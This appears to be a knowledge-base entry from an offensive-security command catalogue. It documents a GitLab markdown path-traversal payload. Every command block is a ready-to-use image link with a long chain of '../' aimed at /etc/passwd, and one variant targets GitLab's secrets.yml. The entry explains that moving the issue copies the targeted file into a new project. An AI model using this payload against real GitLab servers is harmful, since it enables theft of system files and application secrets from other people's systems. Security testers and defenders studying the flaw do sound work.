---
data: >-
  ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
tags:
  - path-traversal
type: command
executor: markdown
platforms:
  - Web
id: 7500cfc7-3ec4-40f9-8bd8-4751110764ca
created_at: '2025-12-11T03:47:59.307Z'
updated_at: '2025-12-11T03:47:59.307Z'
verified: false
validated: true
submitted: true
---
# gitlab-markdown-traversal

## Command

```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

## Description

Markdown syntax used in GitLab issue descriptions to reference arbitrary files via path traversal, exploiting UploadsRewriter during issue movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/uploads/...` | Path with traversal to target file | Yes |

## Examples

### Basic Usage

```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

### Advanced Usage

```markdown
![secrets](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
```

## Expected Output

Triggers file copy when issue is moved, making the file accessible in the new project.

## Related

- [[commands/uploads-rewriter-gsub]]
- [[procedures/Move-Issue-to-Trigger-Arbitrary-File-Read]]
